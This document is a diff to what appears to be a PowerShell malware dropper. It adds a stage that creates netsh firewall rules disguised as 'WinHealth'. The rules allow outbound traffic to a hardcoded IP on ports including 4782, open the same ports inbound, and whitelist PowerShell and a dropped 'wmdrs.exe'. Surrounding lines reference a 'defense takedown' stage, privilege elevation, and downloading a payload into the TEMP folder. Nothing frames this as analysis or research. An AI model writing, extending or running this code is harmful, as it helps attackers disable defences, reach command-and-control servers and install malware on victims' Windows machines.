@@ -101,6 +101,22 @@ if(-not $cbIsAdmin){
     if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail, continuing as user'}
 }
 
+# S1b: FIREWALL OPEN (admin only)
+if($cbIsAdmin){
+    $fwIP='193.26.115.196'
+    $fwPorts=@(80,443,5173,4782)
+    $fwProcs=@("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe","$env:TEMP\wmdrs.exe","$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
+    foreach($p in $fwPorts){
+        netsh advfirewall firewall add rule name="WinHealth TCP $p Out" dir=out action=allow protocol=TCP remoteip=$fwIP remoteport=$p 2>&1 | Out-Null
+        netsh advfirewall firewall add rule name="WinHealth TCP $p In" dir=in action=allow protocol=TCP localport=$p 2>&1 | Out-Null
+    }
+    foreach($x in $fwProcs){
+        if(Test-Path $x){netsh advfirewall firewall add rule name="WinHealth $(Split-Path $x -Leaf)" dir=out action=allow program="$x" enable=yes 2>&1 | Out-Null}
+    }
+    _log "S1b: firewall rules added for $fwIP : $($fwPorts -join ',')"
+    _cb 'S1b' 'ok' "fw open $fwIP : $($fwPorts -join ',')"
+}
+
 # S2: SOPHIA-BASED DEFENSE TAKEDOWN (admin only)
 if($cbIsAdmin){
     try{
@@ -236,7 +252,7 @@ if($payloadExists){
 
 if(-not $payloadExists){
     _log "S5: downloading wdsr681f3e18"
-    $payloadBytes=_dl 'PatchPulsaar.exe'
+    $payloadBytes=_dl 'wdsr681f3e18.exe'
     if($payloadBytes){
         $primaryPath="$env:TEMP\wmdrs.exe"
         [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null
